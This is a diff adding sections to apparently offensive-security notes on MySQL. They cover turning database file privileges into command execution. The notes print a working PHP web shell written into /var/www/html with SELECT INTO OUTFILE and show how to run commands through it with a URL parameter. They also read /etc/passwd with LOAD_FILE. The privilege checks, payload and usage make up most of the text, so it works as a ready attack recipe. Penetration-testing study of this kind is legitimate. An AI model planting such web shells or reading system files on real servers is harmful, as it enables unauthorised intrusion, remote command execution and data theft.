@@ -121,3 +121,85 @@ EXIT;
 
 
 
+---
+
+## Write Local Files (Command Execution via Web Root)
+
+If MySQL runs on a web server (e.g., PHP), and we have the proper privileges, we can achieve command execution by writing a web shell into the web root directory using `SELECT INTO OUTFILE`.
+
+If the file is written successfully, we can access it through the browser and execute system commands.
+
+### Requirements
+
+- `FILE` privilege
+    
+- Write permissions on target directory
+    
+- `secure_file_priv` must allow file operations
+    
+
+Check privileges:
+
+```sql
+SHOW GRANTS FOR CURRENT_USER();
+```
+
+Check restriction:
+
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+
+Possible values:
+
+- `''` → No restriction (read/write allowed anywhere)
+    
+- `/path/` → Only allowed inside that directory
+    
+- `NULL` → File operations disabled
+
+### Write Web Shell
+
+```sql
+SELECT "<?php echo shell_exec($_GET['c']); ?>" 
+INTO OUTFILE '/var/www/html/webshell.php';
+```
+
+If successful:
+
+```
+Query OK, 1 row affected
+```
+
+Execute commands:
+
+```
+http://target/webshell.php?c=id
+```
+
+
+---
+
+## Read Local Files
+
+By default, MySQL does not allow arbitrary file reading. However, if the user has the `FILE` privilege and `secure_file_priv` does not restrict access, local files can be read using `LOAD_FILE()`.
+
+### Requirements
+
+- `FILE` privilege
+    
+- Read permissions on target file
+    
+- `secure_file_priv` allows access
+    
+
+Check restriction:
+```
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+
+Read a file:
+
+```
+SELECT LOAD_FILE('/etc/passwd');
+```
